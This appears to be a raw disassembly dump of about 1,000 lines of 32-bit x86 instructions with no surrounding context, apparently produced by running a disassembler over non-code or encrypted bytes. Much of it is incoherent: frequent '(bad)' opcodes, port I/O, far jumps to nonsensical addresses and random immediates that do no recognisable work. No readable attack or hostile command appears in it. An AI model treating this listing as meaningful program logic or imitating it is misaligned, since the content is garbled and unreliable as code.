  4189a4:	fcmovbe st,st(4)
  4189a6:	fdivp  st(5),st
  4189a8:	clc    
  4189a9:	jle    0x4189f7
  4189ab:	test   bl,dh
  4189ad:	pop    ebp
  4189ae:	jl     0x4189a6
  4189b0:	mov    eax,DWORD PTR ds:0x3679122a
  4189b6:	jae    0x418959
  4189b8:	push   esi
  4189b9:	call   DWORD PTR [esi+0x1427856b]
  4189bf:	cmova  ebx,DWORD PTR [ecx+0x57165803]
  4189c6:	fidiv  WORD PTR [edi-0x1a]
  4189c9:	test   eax,0x76cb7f4c
  4189ce:	ror    BYTE PTR [ebx+0x59],0xd0
  4189d2:	out    dx,al
  4189d3:	out    dx,eax
  4189d4:	or     eax,0x901b670
  4189d9:	and    DWORD PTR [edi],edi
  4189db:	sbb    dl,BYTE PTR [ecx-0x5c27bb7a]
  4189e1:	data16 idiv BYTE PTR [ecx]
  4189e4:	jl     0x4189f2
  4189e6:	addr16 jg 0x418a1b
  4189e9:	or     bh,BYTE PTR [edx-0xe75fcd6]
  4189ef:	add    eax,0x76d0ad1a
  4189f4:	rol    cl,0xd6
  4189f7:	popf   
  4189f8:	ja     0x418a3e
  4189fa:	addr16 adc eax,0x1d656493
  418a00:	sub    DWORD PTR [edx-0x44c07950],eax
  418a06:	aam    0xd4
  418a08:	(bad)  
  418a09:	jmp    0xf9dc850f
  418a0e:	imul   ebp,DWORD PTR [edi+0x2],0xffffffbf
  418a12:	out    dx,eax
  418a13:	jecxz  0x418a55
  418a15:	loope  0x4189f9
  418a17:	mov    ebp,0x18bf72d4
  418a1c:	and    ecx,0x4b
  418a1f:	popf   
  418a20:	aad    0x33
  418a22:	popf   
  418a23:	xor    ebp,DWORD PTR cs:[ebp+0x7acff841]
  418a2a:	mov    ecx,0xa311d5d1
  418a2f:	imul   eax,esi,0x8a6a0a01
  418a35:	pop    ds
  418a36:	ins    DWORD PTR es:[edi],dx
  418a37:	mov    cl,0xd
  418a39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a3a:	dec    esp
  418a3b:	int    0x83
  418a3d:	rcl    BYTE PTR [esi+eiz*8-0x2a],1
  418a41:	int    0xe9
  418a43:	jb     0x418a48
  418a45:	mov    ebx,0x37c19fa3
  418a4a:	mov    esp,0x140008ec
  418a4f:	push   eax
  418a50:	jge    0x418ab1
  418a52:	inc    edx
  418a53:	inc    esp
  418a54:	cld    
  418a55:	(bad)  
  418a56:	mov    eax,0x23f90d61
  418a5b:	fst    DWORD PTR [ecx-0x25]
  418a5e:	add    eax,0xe172947b
  418a63:	push   es
  418a64:	into   
  418a65:	shl    BYTE PTR [eax],1
  418a67:	adc    cl,ch
  418a69:	retf   0x2617
  418a6c:	inc    edx
  418a6d:	jge    0x418a9b
  418a6f:	ins    DWORD PTR es:[edi],dx
  418a70:	ffreep st(1)
  418a72:	inc    edx
  418a73:	inc    ebp
  418a74:	add    BYTE PTR [esi-0x4a768449],cl
  418a7a:	out    dx,al
  418a7b:	int    0x6a
  418a7d:	pop    esi
  418a7e:	sub    esp,esi
  418a80:	fdiv   st(7),st
  418a82:	push   esp
  418a83:	adc    DWORD PTR [ecx+eax*8-0x7d64fb7b],esi
  418a8a:	cmc    
  418a8b:	and    DWORD PTR [esi-0x4d],ebp
  418a8e:	(bad)  [esi-0x3a59d129]
  418a94:	shr    dh,1
  418a96:	sbb    BYTE PTR [eax-0x42edfb39],dl
  418a9c:	jp     0x418aa9
  418a9e:	xor    eax,0x6c202533
  418aa3:	add    esi,DWORD PTR [ecx+eax*1-0xaa59f45]
  418aaa:	pop    edi
  418aab:	dec    ebp
  418aac:	in     al,dx
  418aad:	sti    
  418aae:	retf   0xdc77
  418ab1:	mov    DWORD PTR [ebp+0x21],ebx
  418ab4:	jmp    0xbd8f4252
  418ab9:	and    DWORD PTR [ebx-0x3831fd5],esp
  418abf:	cmc    
  418ac0:	inc    esi
  418ac1:	call   0x3d5:0xdcbf951b
  418ac8:	das    
  418ac9:	pop    esi
  418aca:	loope  0x418a9c
  418acc:	sbb    al,0xa1
  418ace:	jmp    0xa230:0x2bb734a7
  418ad5:	aam    0xa3
  418ad7:	xor    eax,0xce5c419d
  418adc:	push   eax
  418add:	xchg   BYTE PTR [edi],dl
  418adf:	xor    al,0x8a
  418ae1:	cs inc ebx
  418ae3:	scas   eax,DWORD PTR es:[edi]
  418ae4:	xor    DWORD PTR [esi+0x249ff48d],esp
  418aea:	add    DWORD PTR [esi-0x5f],ecx
  418aed:	jle    0x418aee
  418aef:	xlat   BYTE PTR ds:[ebx]
  418af0:	imul   edx,DWORD PTR [ecx+eax*2-0x64],0x5e
  418af5:	push   ecx
  418af6:	(bad)  
  418af7:	adc    al,0x89
  418af9:	adc    bh,BYTE PTR [eax+0x4e]
  418afc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418afd:	lock fimul DWORD PTR [edi-0x10c4c0f2]
  418b04:	push   edx
  418b05:	sti    
  418b06:	not    esi
  418b08:	outs   dx,BYTE PTR ds:[esi]
  418b09:	xor    al,0x1b
  418b0b:	out    0xfb,al
  418b0d:	dec    edx
  418b0e:	shl    BYTE PTR [edi],cl
  418b10:	hlt    
  418b11:	inc    eax
  418b12:	fstp   TBYTE PTR [ecx-0x49]
  418b15:	mov    eax,0x4132900
  418b1a:	xchg   DWORD PTR [esi],esp
  418b1c:	cmp    al,0x2e
  418b1e:	pop    ecx
  418b1f:	xor    ecx,DWORD PTR [edx]
  418b21:	inc    esi
  418b22:	call   0x97de:0x4219519a
  418b29:	je     0x418ab7
  418b2b:	arpl   WORD PTR [ebp-0x1b],si
  418b2e:	push   esi
  418b2f:	cs neg dh
  418b32:	(bad)  [eax+0x32]
  418b35:	lea    esp,[edi]
  418b37:	mov    bh,0x87
  418b39:	in     eax,dx
  418b3a:	add    edi,DWORD PTR [eax]
  418b3c:	lods   eax,DWORD PTR ds:[esi]
  418b3d:	pop    ds
  418b3e:	lds    ebp,FWORD PTR [ebp+ebx*2+0x7a984d05]
  418b45:	xchg   edi,eax
  418b46:	neg    BYTE PTR ds:0xb83e4f3f
  418b4c:	adc    eax,0x4d98c52c
  418b51:	or     al,0x26
  418b53:	repnz test DWORD PTR [ebx+0x18],eax
  418b57:	pusha  
  418b58:	bound  edi,QWORD PTR [ebx]
  418b5a:	pushf  
  418b5b:	dec    edi
  418b5c:	das    
  418b5d:	or     eax,0x579e4745
  418b62:	cmp    edx,ebx
  418b64:	das    
  418b65:	test   DWORD PTR ds:0xba5e5388,0xc8d4d1ec
  418b6f:	pop    ebp
  418b70:	inc    ebp
  418b71:	jno    0x418b31
  418b73:	adc    edx,ebp
  418b75:	add    DWORD PTR [esi],edx
  418b77:	jmp    0x223c4d97
  418b7c:	hlt    
  418b7d:	scas   eax,DWORD PTR es:[edi]
  418b7e:	cmp    bl,BYTE PTR [eax+eiz*1+0x7b27f78e]
  418b85:	(bad)  
  418b86:	shr    BYTE PTR [ecx],1
  418b88:	loopne 0x418b25
  418b8a:	push   es
  418b8b:	dec    eax
  418b8c:	int3   
  418b8d:	gs push ecx
  418b8f:	ins    BYTE PTR es:[edi],dx
  418b90:	push   edx
  418b91:	icebp  
  418b92:	mov    edi,0xf3b77be1
  418b97:	pop    ss
  418b98:	bound  ebx,QWORD PTR [ebp+edi*8-0x761c0859]
  418b9f:	outs   dx,DWORD PTR ds:[esi]
  418ba0:	jle    0x418b29
  418ba2:	pop    edx
  418ba3:	(bad)  
  418ba4:	jmp    0x46ec:0x2b06c518
  418bab:	fdiv   DWORD PTR [ebp-0x9]
  418bae:	cli    
  418baf:	jle    0x418bd6
  418bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bb2:	stc    
  418bb3:	mov    esi,DWORD PTR [ebp+0x5d]
  418bb6:	in     al,dx
  418bb7:	imul   ebp,DWORD PTR [edx+eiz*1-0x4e],0xd4f2de97
  418bbf:	sbb    DWORD PTR [ecx+0x4be4a6a4],ebp
  418bc5:	cli    
  418bc6:	mov    bl,0x4
  418bc8:	adc    BYTE PTR [eax+0x4e0e566d],ah
  418bce:	mov    esp,0xfd99305d
  418bd3:	push   esi
  418bd4:	xchg   ebx,eax
  418bd5:	cld    
  418bd6:	pop    ax
  418bd8:	loop   0x418b82
  418bda:	and    esi,DWORD PTR [eax-0x323096ad]
  418be0:	cmp    DWORD PTR [esi-0x1572d17a],ebx
  418be6:	int3   
  418be7:	jmp    0x9e035571
  418bec:	scas   al,BYTE PTR es:[edi]
  418bed:	xor    BYTE PTR [esi],dh
  418bef:	repnz lds edi,FWORD PTR [edi+0x2c29d45c]
  418bf6:	lods   al,BYTE PTR ds:[esi]
  418bf7:	rcl    DWORD PTR [edx],1
  418bf9:	pop    ss
  418bfa:	aas    
  418bfb:	pop    ecx
  418bfc:	aad    0xbc
  418bfe:	and    bl,bh
  418c00:	or     esi,DWORD PTR [esi+0x3e]
  418c03:	cmp    ah,dl
  418c05:	retf   0x7f57
  418c08:	mov    cl,0xfb
  418c0a:	call   DWORD PTR [ebp-0x1ba4146f]
  418c10:	aaa    
  418c11:	jb     0x418bf6
  418c13:	xchg   edx,eax
  418c14:	pop    edx
  418c15:	clc    
  418c16:	test   BYTE PTR [ecx-0x65],cl
  418c19:	fs mov ecx,0xac10e215
  418c1f:	mov    eax,0x12067397
  418c24:	test   al,0xd
  418c26:	push   0x9935f26
  418c2b:	mov    ah,0x22
  418c2d:	pop    esp
  418c2e:	aas    
  418c2f:	dec    edx
  418c30:	mov    DWORD PTR [ecx],ecx
  418c32:	inc    edi
  418c33:	test   eax,0x2b1b728f
  418c38:	retf   
  418c39:	sbb    al,0x5a
  418c3b:	lods   al,BYTE PTR ds:[esi]
  418c3c:	add    DWORD PTR [esi],esi
  418c3e:	inc    esp
  418c3f:	inc    ebp
  418c40:	add    edi,DWORD PTR [ecx-0x23]
  418c43:	es mov ebp,0x1137b1e9
  418c49:	xor    al,0x8b
  418c4b:	mov    WORD PTR [edx+0x4867e139],cs
  418c51:	lds    ecx,FWORD PTR [edi-0x68]
  418c54:	sahf   
  418c55:	mov    ds:0xa8cd28ae,al
  418c5a:	fdivp  st(4),st
  418c5c:	push   cs
  418c5d:	or     DWORD PTR [ecx+0x2dc54036],esp
  418c63:	mov    bl,0x2f
  418c65:	shr    dl,0x15
  418c68:	popa   
  418c69:	fsub   DWORD PTR [ecx-0x3d424d00]
  418c6f:	mov    al,ds:0x514bd1be
  418c74:	jns    0x418bf6
  418c76:	rol    ch,1
  418c78:	jl     0x418cba
  418c7a:	and    edi,ecx
  418c7c:	pushf  
  418c7d:	xchg   esp,eax
  418c7e:	cmp    BYTE PTR [ebx+0xe],al
  418c81:	cmp    DWORD PTR [esi+0x64],edi
  418c84:	sbb    al,0x2
  418c86:	sahf   
  418c87:	pop    ds
  418c88:	push   cs
  418c89:	xchg   ebx,eax
  418c8a:	test   esi,ecx
  418c8c:	into   
  418c8d:	test   ecx,ebx
  418c8f:	or     dh,0xef
  418c92:	arpl   WORD PTR [edi+0x64],sp
  418c95:	jge    0x418cf0
  418c97:	out    0x2b,al
  418c99:	rcl    BYTE PTR [edx-0x51],1
  418c9c:	xchg   esp,eax
  418c9d:	test   BYTE PTR ds:0x7e51d961,0x4b
  418ca4:	xor    dh,BYTE PTR [esi+0x56]
  418ca7:	sub    eax,0xc33840
  418cac:	jl     0x418c34
  418cae:	dec    DWORD PTR [edi-0x50a31cea]
  418cb4:	mov    bh,0xbd
  418cb6:	mov    ah,0xb0
  418cb8:	mov    esi,0xbba69b5d
  418cbd:	xlat   BYTE PTR ds:[ebx]
  418cbe:	cli    
  418cbf:	jmp    0x885a73f8
  418cc4:	scas   al,BYTE PTR es:[edi]
  418cc5:	ror    BYTE PTR [eax+0x79623900],1
  418ccb:	(bad)  
  418ccc:	clc    
  418ccd:	aas    
  418cce:	mov    bh,0xd0
  418cd0:	jbe    0x418d29
  418cd2:	cmp    DWORD PTR [ebp+esi*8-0x6308bb91],ebx
  418cd9:	xchg   edi,eax
  418cda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cdb:	dec    ecx
  418cdc:	pop    ebx
  418cdd:	lods   al,BYTE PTR ds:[esi]
  418cde:	pop    ecx
  418cdf:	(bad)  
  418ce0:	push   0xffffffd6
  418ce2:	jno    0x418cbf
  418ce4:	mov    bh,0x30
  418ce6:	xor    al,0xc3
  418ce8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ce9:	fst    st(0)
  418ceb:	add    ch,al
  418ced:	mov    ebx,0x3eb6fad4
  418cf2:	mov    edi,0xb8d20875
  418cf7:	mov    esp,0x7f739214
  418cfc:	sbb    DWORD PTR [ecx],esi
  418cfe:	cmc    
  418cff:	call   0x9e488a27
  418d04:	in     al,0x21
  418d06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d07:	xchg   ebp,eax
  418d08:	pop    ebp
  418d09:	ret    
  418d0a:	sbb    bl,cl
  418d0c:	xchg   edi,eax
  418d0d:	xchg   ebp,eax
  418d0e:	stos   BYTE PTR es:[edi],al
  418d0f:	loopne 0x418d8b
  418d11:	dec    ecx
  418d12:	fisub  WORD PTR [ecx+eax*4]
  418d15:	outs   dx,DWORD PTR ds:[esi]
  418d16:	inc    eax
  418d17:	mov    DWORD PTR [eax-0x69],0xeb5509c
  418d1e:	cmp    bh,BYTE PTR [ebx+edi*2-0xc]
  418d22:	stos   BYTE PTR es:[edi],al
  418d23:	jp     0x418cc2
  418d25:	test   eax,0x24a0794b
  418d2a:	xlat   BYTE PTR ds:[ebx]
  418d2b:	and    ah,dh
  418d2d:	add    edi,DWORD PTR [ecx-0x1d]
  418d30:	jbe    0x418d21
  418d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d33:	pushf  
  418d34:	pop    es
  418d35:	enter  0x8576,0x31
  418d39:	mov    al,0xd9
  418d3b:	icebp  
  418d3c:	jl     0x418d20
  418d3e:	aaa    
  418d3f:	or     DWORD PTR [ebp+edi*4-0xb5d4f2],edi
  418d46:	aam    0x8b
  418d48:	cld    
  418d49:	and    bl,BYTE PTR [ebx]
  418d4b:	sar    BYTE PTR [edi],0x98
  418d4e:	lods   eax,DWORD PTR ds:[esi]
  418d4f:	mov    WORD PTR [esi-0x4288beb4],ss
  418d55:	ds loope 0x418d45
  418d58:	push   ebp
  418d59:	das    
  418d5a:	lock pusha 
  418d5c:	mov    ch,0x15
  418d5e:	jmp    0xc90dbf18
  418d63:	outs   dx,BYTE PTR ds:[esi]
  418d64:	or     ch,dh
  418d66:	mov    es,esi
  418d68:	dec    esp
  418d69:	(bad)  
  418d6b:	adc    esi,DWORD PTR [ecx]
  418d6d:	or     DWORD PTR [esp+ecx*2],0x80d28521
  418d74:	out    dx,eax
  418d75:	je     0x418d46
  418d77:	iret   
  418d78:	sub    edi,ebx
  418d7a:	jge    0x418d0e
  418d7c:	ret    
  418d7d:	cmp    bh,BYTE PTR [eax+0x55]
  418d80:	iret   
  418d81:	gs (bad) 
  418d83:	xor    al,0xf5
  418d85:	mov    bl,0xf8
  418d87:	fiadd  WORD PTR [ecx+0x4cd1512f]
  418d8d:	xchg   edi,eax
  418d8e:	mov    cl,0xb2
  418d91:	stos   BYTE PTR es:[edi],al
  418d92:	(bad)  
  418d94:	sub    ah,BYTE PTR [ecx+0x503f4f0]
  418d9a:	outs   dx,BYTE PTR ds:[esi]
  418d9b:	rol    BYTE PTR [ebx+ebp*2],0x13
  418d9f:	retf   0xfb87
  418da2:	pop    esi
  418da3:	jb     0x418d77
  418da5:	loopne 0x418d27
  418da7:	jns    0x418d3a
  418da9:	add    bh,BYTE PTR [eax]
  418dab:	and    DWORD PTR [edi+0x76c1b545],esp
  418db1:	xchg   BYTE PTR [ebp+0x24989427],bh
  418db7:	test   eax,0x2f0971c
  418dbc:	std    
  418dbd:	jbe    0x418d95
  418dbf:	xabort 0x4
  418dc2:	adc    BYTE PTR [edi],bl
  418dc4:	inc    edx
  418dc5:	fisttp DWORD PTR [esp+ecx*4+0x7e8e731b]
  418dcc:	(bad)  
  418dcd:	(bad)  
  418dce:	div    DWORD PTR [edx+0x7a]
  418dd1:	ss push ebx
  418dd3:	push   ss
  418dd4:	cs sub eax,0x5697b5a8
  418dda:	push   0x69
  418ddc:	mov    ecx,0xd34ca4f7
  418de1:	inc    edi
  418de2:	fst    st(3)
  418de4:	jae    0x418dba
  418de6:	pop    edi
  418de7:	imul   esi,DWORD PTR [edx+0x7619ca9],0xe472e313
  418df1:	jbe    0x418e27
  418df3:	dec    ebx
  418df4:	jo     0x418dc8
  418df6:	rcl    ah,0x17
  418df9:	add    al,0xf5
  418dfb:	and    edx,DWORD PTR ds:0x238d3c21
  418e01:	hlt    
  418e02:	ret    0x49e4
  418e05:	jns    0x418db1
  418e07:	add    eax,0x372aa2cb
  418e0c:	mov    WORD PTR [ecx],ss
  418e0e:	not    bl
  418e10:	(bad)  
  418e11:	ja     0x418de3
  418e13:	fs int3 
  418e15:	in     al,dx
  418e16:	ror    BYTE PTR [ecx],0xb9
  418e19:	add    eax,0xbfd2749c
  418e1e:	gs push ss
  418e20:	or     ebx,DWORD PTR [ebx]
  418e22:	in     al,0xdb
  418e24:	and    al,0x7b
  418e26:	loop   0x418dd4
  418e28:	jb     0x418dd6
  418e2a:	adc    DWORD PTR [esi+0x4e],ebp
  418e2d:	jmp    0x418e54
  418e2f:	rdtsc  
  418e31:	cmp    al,0x3d
  418e33:	idiv   DWORD PTR [edx]
  418e35:	into   
  418e36:	fwait
  418e37:	int    0xad
  418e39:	rcl    BYTE PTR [ecx-0x65],0x4d
  418e3d:	xchg   esi,eax
  418e3e:	icebp  
  418e3f:	ins    DWORD PTR es:[edi],dx
  418e40:	addr16 call 0xc0a5b1c1
  418e46:	das    
  418e47:	enter  0x2ad1,0x21
  418e4b:	inc    edi
  418e4c:	mov    bh,BYTE PTR [ecx]
  418e4e:	das    
  418e4f:	(bad)  [ebx-0x36e8dd04]
  418e55:	jmp    0x9563:0xba3c514d
  418e5c:	pop    edx
  418e5d:	dec    ebp
  418e5e:	lea    edx,[edi-0x52b232a7]
  418e64:	or     bh,BYTE PTR [esi+0x16]
  418e67:	jb     0x418e5c
  418e69:	stc    
  418e6a:	dec    esp
  418e6b:	add    al,0xe7
  418e6d:	aas    
  418e6e:	xchg   ah,dl
  418e70:	inc    esp
  418e71:	lahf   
  418e72:	(bad)  
  418e73:	mov    ds:0x57bd1710,al
  418e78:	mov    dh,0x4d
  418e7a:	jg     0x418e21
  418e7c:	pop    ss
  418e7d:	int3   
  418e7e:	mov    al,ds:0xf0dfe890
  418e83:	inc    edi
  418e84:	js     0x418e69
  418e86:	adc    eax,DWORD PTR [edi-0x7a6dda7e]
  418e8c:	std    
  418e8d:	sub    eax,0xcda6e13d
  418e92:	mov    WORD PTR ds:0xb090f118,es
  418e98:	add    eax,ecx
  418e9a:	xchg   DWORD PTR [ebp-0x4e224e71],ebx
  418ea0:	mov    bl,0x78
  418ea2:	add    dl,cl
  418ea4:	mov    eax,ds:0x46704d06
  418ea9:	inc    eax
  418eaa:	cdq    
  418eab:	es push ss
  418ead:	(bad)  
  418eae:	xchg   esi,eax
  418eaf:	dec    edx
  418eb0:	xchg   ebp,eax
  418eb1:	lds    ebx,FWORD PTR [esi-0x3a]
  418eb4:	jmp    FWORD PTR [ecx]
  418eb6:	ret    0x9b8c
  418eb9:	loopne 0x418ea3
  418ebb:	loope  0x418f3c
  418ebd:	push   edx
  418ebe:	and    eax,0xdbca0a36
  418ec3:	sbb    al,0x36
  418ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ec6:	mov    ah,BYTE PTR [eax-0x55]
  418ec9:	int    0xa1
  418ecb:	rcr    BYTE PTR [edi-0x3495cdd9],1
  418ed1:	repz call 0x6757:0x2533bdb2
  418ed9:	jo     0x418ef0
  418edb:	cs leave 
  418edd:	sbb    al,0xc4
  418edf:	mov    ss,WORD PTR [esi+eax*2-0x71eee951]
  418ee6:	call   0xba31:0x8f2652b2
  418eed:	jns    0x418f56
  418eef:	lea    ecx,[esi]
  418ef1:	loope  0x418e96
  418ef3:	and    al,0x9c
  418ef5:	jg     0x418f07
  418ef7:	out    0xe1,al
  418ef9:	jbe    0x418ef6
  418efb:	jae    0x418f75
  418efd:	cli    
  418efe:	hlt    
  418eff:	adc    eax,0xf0acf25
  418f04:	dec    edi
  418f05:	mov    cl,BYTE PTR [esi+0x19]
  418f08:	cdq    
  418f09:	cmp    DWORD PTR [esi+ebp*1],0xfb19ce39
  418f10:	dec    edx
  418f11:	and    eax,0xc9214dd1
  418f16:	adc    ch,bh
  418f18:	jmp    0x381:0xa0876d5d
  418f1f:	(bad)  
  418f21:	push   ds
  418f22:	push   ss
  418f23:	in     eax,0xfd
  418f25:	int    0x61
  418f27:	jecxz  0x418ec4
  418f29:	sbb    DWORD PTR [ebp-0x21aadf6c],0x209b8dc3
  418f33:	(bad)  
  418f34:	mov    edx,0x93023542
  418f39:	iret   
  418f3a:	add    eax,0xa88db4
  418f3f:	shl    DWORD PTR [eax+eax*1],1
  418f42:	jnp    0x418f48
  418f44:	and    al,bl
  418f46:	and    ebp,DWORD PTR [ecx+0xf787549]
  418f4c:	int3   
  418f4d:	(bad)  
  418f4f:	sbb    ebx,DWORD PTR [edx]
  418f51:	ds cdq 
  418f53:	xchg   edx,eax
  418f54:	inc    ebx
  418f55:	sub    DWORD PTR es:[eax-0x26],eax
  418f59:	jp     0x418fd3
  418f5b:	pusha  
  418f5c:	mov    es,WORD PTR [ebx+0x299be371]
  418f62:	sub    bl,BYTE PTR [edx+0x732ea0a8]
  418f68:	repz dec ebp
  418f6a:	pop    ss
  418f6b:	scas   eax,DWORD PTR es:[edi]
  418f6c:	add    DWORD PTR [esi-0x63],edx
  418f6f:	mov    al,0x26
  418f71:	pop    es
  418f72:	data16 clc 
  418f74:	lds    ebp,FWORD PTR [ecx]
  418f76:	out    0x7a,al
  418f78:	popf   
  418f79:	jns    0x418ff2
  418f7b:	adc    DWORD PTR [esi*1+0x5d02720],0x7c0fe4f8
  418f86:	fstp   QWORD PTR [edi]
  418f88:	xchg   ax,ax
  418f8a:	inc    edi
  418f8b:	je     0x418fc1
  418f8d:	dec    esi
  418f8e:	sub    eax,0xa6a77259
  418f93:	test   al,0xa1
  418f95:	add    DWORD PTR [ebx],edx
  418f97:	inc    edx
  418f98:	cdq    
  418f99:	addr16 popa 
  418f9b:	cwde   
  418f9c:	pop    ebx
  418f9d:	test   BYTE PTR [eax],bl
  418f9f:	(bad)  
  418fa0:	stos   DWORD PTR es:[edi],eax
  418fa1:	mov    al,ds:0x634831f1
  418fa6:	jle    0x418f43
  418fa8:	rol    BYTE PTR [ebx+0x53],1
  418fab:	and    al,0x6
  418fad:	xchg   ebp,eax
  418fae:	jle    0x418f44
  418fb0:	jmp    0x418fae
  418fb2:	neg    BYTE PTR [ecx-0x31]
  418fb5:	std    
  418fb6:	lea    ecx,[ecx-0x4846ab67]
  418fbc:	inc    ebx
  418fbd:	or     edi,ebp
  418fbf:	imul   ecx,esp,0x15644458
  418fc5:	aad    0x88
  418fc7:	bound  esp,QWORD PTR [edi]
  418fc9:	inc    esi
  418fca:	in     eax,dx
  418fcb:	push   esp
  418fcc:	ja     0x419027
  418fce:	cwde   
  418fcf:	mov    ebp,0x6e360b59
  418fd4:	(bad)  
  418fd5:	mov    ecx,0xfe76ee81
  418fda:	mov    DWORD PTR cs:[ecx+0x17],eax
  418fde:	mov    al,ds:0x859aa734
  418fe3:	mov    eax,edi
  418fe5:	adc    BYTE PTR [ebp+esi*1-0x8],0x7b
  418fea:	jge    0x419043
  418fec:	mov    ss,WORD PTR [ecx-0x58fc7e4c]
  418ff2:	fs mov al,0x19
  418ff5:	jb     0x418fd0
  418ff7:	dec    edx
  418ff8:	ds mov bl,0x62
  418ffb:	mov    esi,?
  418ffd:	push   ebx
  418ffe:	in     al,0x21
  419000:	sahf   
  419001:	ja     0x419053
  419003:	jno    0x419004
  419005:	clc    
  419006:	xchg   ecx,eax
  419007:	sti    
  419008:	or     eax,eax
  41900a:	sub    bh,BYTE PTR [ebx-0x734d5bb9]
  419010:	test   eax,0xe7abaed5
  419015:	jne    0x419054
  419017:	add    edx,DWORD PTR [esi+0x30f0c4be]
  41901d:	mov    DWORD PTR ds:0x295a524f,esi
  419023:	sub    edx,eax
  419025:	xor    dh,BYTE PTR [esi]
  419027:	test   DWORD PTR [ecx+0x6b],edi
  41902a:	xchg   BYTE PTR [edx],bl
  41902c:	lods   eax,DWORD PTR ds:[esi]
  41902d:	scas   eax,DWORD PTR es:[edi]
  41902e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41902f:	imul   esi,DWORD PTR [eax+ebx*1],0x3cd744ad
  419036:	jae    0x419064
  419038:	mov    esi,0x883b6a10
  41903d:	pop    ss
  41903e:	ret    0xa5a3
  419041:	loop   0x4190bf
  419043:	scas   al,BYTE PTR es:[edi]
  419044:	sahf   
  419045:	int    0xdf
  419047:	inc    ebx
  419048:	fidiv  WORD PTR [edi]
  41904a:	sbb    BYTE PTR ds:0xd68b9961,ah
  419050:	xor    al,0xf8
  419052:	fchs   
  419054:	inc    eax
  419055:	test   BYTE PTR [esi+0x4699e1c7],ch
  41905b:	call   ebp
  41905d:	fst    QWORD PTR [esi+0x64]
  419060:	outs   dx,BYTE PTR ds:[esi]
  419061:	pcmpeqb mm0,mm5
  419064:	adc    BYTE PTR ds:0xc0d4155,cl
  41906a:	outs   dx,DWORD PTR ds:[esi]
  41906b:	xor    al,0x7f
  41906d:	xlat   BYTE PTR ds:[ebx]
  41906e:	mov    edx,0x9ef44b0c
  419073:	dec    esi
  419074:	pop    ecx
  419075:	sub    ebx,DWORD PTR gs:[edi+edi*4+0x58]
  41907a:	jae    0x41904c
  41907c:	mov    eax,ds:0x531f6437
  419081:	repz ss hlt 
  419084:	sbb    dh,cl
  419086:	xchg   DWORD PTR [ecx+0x1393976d],edx
  41908c:	jb     0x41906c
  41908e:	and    ebp,0xffffffde
  419091:	and    eax,0x44d7f881
  419096:	cwde   
  419097:	xor    ecx,0x22
  41909a:	sbb    DWORD PTR [edi],edi
  41909c:	push   DWORD PTR [edx+eax*1]
  41909f:	dec    ebp
  4190a0:	or     eax,0x300a64c3
  4190a5:	int3   
  4190a6:	std    
  4190a7:	clc    
  4190a8:	fs inc esi
  4190aa:	lea    esi,[ecx-0x66]
  4190ad:	fwait
  4190ae:	test   BYTE PTR [ecx-0x29],0x5b
  4190b2:	inc    ebp
  4190b3:	jmp    0x427c:0x17815490
  4190ba:	sub    DWORD PTR [esi-0x80],ebx
  4190bd:	and    eax,0xb44f8b3c
  4190c2:	jae    0x4190a9
  4190c4:	sbb    eax,0xef0d8873
  4190c9:	mov    ecx,0x76f49daa
  4190ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190cf:	push   edi
  4190d0:	fadd   st,st(0)
  4190d2:	mov    al,0x2
  4190d4:	icebp  
  4190d5:	hlt    
  4190d6:	js     0x419105
  4190d8:	adc    edi,ecx
  4190da:	dec    ebp
  4190db:	pop    edi
  4190dc:	daa    
  4190dd:	add    al,0xec
  4190df:	lahf   
  4190e0:	je     0x41906b
  4190e2:	lds    ebx,FWORD PTR [ebx]
  4190e4:	push   eax
  4190e5:	push   esi
  4190e6:	in     al,0x69
  4190e8:	mov    al,ds:0x7fa27082
  4190ed:	adc    BYTE PTR [edi],bh
  4190ef:	addr16 ds into 
  4190f2:	loop   0x4190d1
  4190f4:	pop    esp
  4190f5:	dec    edi
  4190f6:	popf   
  4190f7:	and    al,0x10
  4190f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190fa:	xlat   BYTE PTR ds:[ebx]
  4190fb:	push   esp
  4190fc:	and    DWORD PTR [ecx-0x19157e5c],ebx
  419102:	pop    es
  419103:	adc    bl,dl
  419105:	imul   eax,DWORD PTR [ebx],0xffffff9a
  419108:	xchg   BYTE PTR [esi+0x225a7737],bl
  41910e:	add    ebp,edx
  419110:	mov    esi,0x9609b71f
  419115:	mov    al,0x4d
  419117:	mov    eax,0x328b157e
  41911c:	rol    BYTE PTR [ebp+eax*1+0x3fdcca21],cl
  419123:	jnp    0x4190d8
  419125:	xor    al,BYTE PTR [esi]
  419127:	fs sub eax,0x8da2e304
  41912d:	add    al,0x6c
  41912f:	push   es
  419130:	mov    edx,0xcd1972b6
  419135:	gs aas 
  419137:	fstp   QWORD PTR [eax]
  419139:	pop    esi
  41913a:	sbb    ecx,DWORD PTR [ebx-0x309176f5]
  419140:	xchg   edx,eax
  419141:	fidivr WORD PTR [edx+0x2e75e237]
  419147:	xor    DWORD PTR [edi+esi*2-0x61400894],eax
  41914e:	call   0x20ebed3b
  419153:	mov    ah,0x5e
  419155:	jne    0x41914a
  419157:	sub    BYTE PTR [edx],ch
  419159:	and    BYTE PTR [ecx-0x563f970],dl
  41915f:	mov    al,0x22
  419161:	arpl   dx,cx
  419163:	jge    0x419112
  419165:	mov    dh,0x56
  419167:	pop    ebp
  419168:	bound  ebp,QWORD PTR [edx-0x3a]
  41916b:	retf   0x6a79
  41916e:	test   ecx,eax
  419170:	mov    eax,0x91f639ad
  419175:	lea    esp,[edi-0x1e]
  419178:	adc    esp,DWORD PTR [edx]
  41917a:	out    dx,al
  41917b:	mov    ebx,DWORD PTR [ecx+0x7b77dd9f]
  419181:	push   ebx
  419182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419183:	popa   
  419184:	sub    esp,DWORD PTR [edi-0x7a72e01]
  41918a:	jmp    0xb285:0x4688482b
  419191:	adc    al,0x72
  419193:	lea    esp,[eax]
  419195:	pop    ecx
